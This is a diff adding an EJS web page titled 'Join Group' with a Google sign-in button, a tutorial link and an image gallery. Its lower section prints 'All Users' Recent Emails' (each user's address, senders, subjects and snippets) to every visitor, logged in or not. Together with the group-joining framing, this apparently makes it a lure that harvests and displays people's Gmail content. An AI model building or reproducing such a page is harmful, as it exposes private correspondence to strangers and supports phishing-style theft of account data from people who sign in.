@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Join Group</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <style>
+    * {
+      padding: 0;
+      margin: 0;
+      font-family: Sans-Serif;
+      box-sizing: border-box;
+    }
+    
+    .link{
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 300px;
+      height: 400px;
+      background: black;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      border-radius: 10px;
+      flex-direction: column;
+    }
+    .link a{
+      text-decoration: none;
+      background: blue;
+      padding: 10px;
+      border-radius: 10px;
+      color: white;
+      margin: 5px;
+    }
+    a.blackLink {
+		display: inline-block;
+		background-color: #000;
+		color: #fff;
+		padding: 10px 20px;
+		text-decoration: none;
+		border-radius: 6px;
+		font-weight: bold;
+		transition: background-color 0.3s, transform 0.2s;
+		border: 1px solid white;
+	}
+	
+	a.blackLink:hover {
+		background-color: #333;
+		transform: scale(1.05);
+	}
+    .iframe {
+      width: 100%;
+      height: 500px;
+      border: none;
+      margin-bottom: 20px;
+    }
+
+    .picDiv {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 15px;
+      padding: 20px;
+    }
+
+    .picDiv img {
+      width: 100%;
+      max-width: 300px;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+      transition: transform 0.3s ease;
+    }
+
+    .picDiv img:hover {
+      transform: scale(1.05);
+    }
+
+    @media (max-width: 768px) {
+      .picDiv img {
+        max-width: 90%;
+      }
+    }
+
+    body {
+      padding: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <% if (user && user.displayName && user.emails) { %>
+    <h2>Welcome <%= user.displayName %></h2>
+    <p><strong>Email:</strong> <%= user.emails[0].value %></p>
+    <p><a href="/logout">Logout</a></p>
+  <% } else { %>
+    
+    <div class="link">
+      <a href="/auth/google">Sign in with Google</a>
+      <a class="blackLink">Sign in video Tutorial</a>
+    </div>
+
+
+    <div class="picDiv">
+      <img src="/images/pic1.jpg" alt="pic1">
+      <img src="/images/pic2.jpg" alt="pic2">
+      <img src="/images/pic3.jpg" alt="pic3">
+      <img src="/images/pic4.jpg" alt="pic4">
+    </div>
+  <% } %>
+
+  <% if (mails && mails.length > 0) { %>
+    <hr>
+    <h3>All Users' Recent Emails:</h3>
+    <ul>
+      <% mails.forEach(mail => { %>
+        <li>
+          <strong>User:</strong> <%= mail.userName %> (<%= mail.email %>)<br>
+          <strong>From:</strong> <%= mail.from %><br>
+          <strong>Subject:</strong> <%= mail.subject %><br>
+          <strong>Snippet:</strong> <%= mail.snippet %><br><br>
+          <hr>
+        </li>
+      <% }) %>
+    </ul>
+  <% } else if (mails) { %>
+    <p>No emails found.</p>
+  <% } %>
+
+</body>
+</html>
